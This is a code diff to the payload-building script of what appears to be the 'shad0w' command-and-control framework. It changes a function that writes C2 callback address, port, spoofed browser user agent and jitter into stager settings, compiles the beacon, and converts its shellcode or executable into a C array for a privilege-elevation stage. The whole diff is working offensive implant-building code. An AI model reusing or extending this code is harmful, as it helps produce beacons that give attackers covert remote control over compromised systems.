@@ -325,39 +325,40 @@ def shellcode_to_array(data):
             continue
 
     array += "\n};\n"
-    array += f"int stage_len = {len(data)};\n"
 
     return array
 
 
-def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, format=None, static=None):
+def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, format=None, static=None, writeonly=False, rcode=None):
     # if (rootdir or os or arch or secure) == None:
     #     return
 
-    if static == None:
-        clone_source_files(asm=True, rootdir="stager")
-    elif static == True:
-        clone_source_files(asm=True)
+    if (writeonly is False) and rcode is None:
 
-    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
-#define _C2_CALLBACK_PORT %s
-#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
-#define _CALLBACK_JITTER %s000
-""" % (shad0w.endpoint, shad0w.addr[1], 1)
+        if static == None:
+            clone_source_files(asm=True, rootdir="stager")
+        elif static == True:
+            clone_source_files(asm=True)
 
-    update_settings_file(None, custom_template=settings_template)
+        settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
+    #define _C2_CALLBACK_PORT %s
+    #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+    #define _CALLBACK_JITTER %s000
+    """ % (shad0w.endpoint, shad0w.addr[1], 1)
 
-    # now we need to run 'make' inside the cloned dir
-    # shad0w.debug.spinner(f"Preparing exploit...")
-    make_in_clone(arch=arch, platform=os, secure=secure, static=True)
-    # shad0w.debug.stop_spinner = True
+        update_settings_file(None, custom_template=settings_template)
 
-    # get the shellcode from the payload
-    if format == "raw":
-        rcode = extract_shellcode()
-    elif format == "exe":
-        with open("/root/shad0w/beacon/beacon.exe", "rb") as file:
-            rcode = file.read()
+        # now we need to run 'make' inside the cloned dir
+        # shad0w.debug.spinner(f"Preparing exploit...")
+        make_in_clone(arch=arch, platform=os, secure=secure, static=True)
+        # shad0w.debug.stop_spinner = True
+
+        # get the shellcode from the payload
+        if format == "raw":
+            rcode = extract_shellcode()
+        elif format == "exe":
+            with open("/root/shad0w/beacon/beacon.exe", "rb") as file:
+                rcode = file.read()
 
     # convert the shellcode to C array
     stage_template = shellcode_to_array(rcode)
